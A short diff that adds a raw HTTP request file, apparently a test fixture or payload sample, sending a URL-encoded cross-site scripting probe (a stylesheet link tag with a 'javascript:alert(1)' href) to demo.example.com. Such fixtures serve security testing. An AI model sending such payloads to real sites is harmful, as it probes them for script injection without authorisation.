@@ -1,0 +1,4 @@
+GET /a?q="<link%20rel%3Dstylesheet%20href%3D"javascript:alert(1)">" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
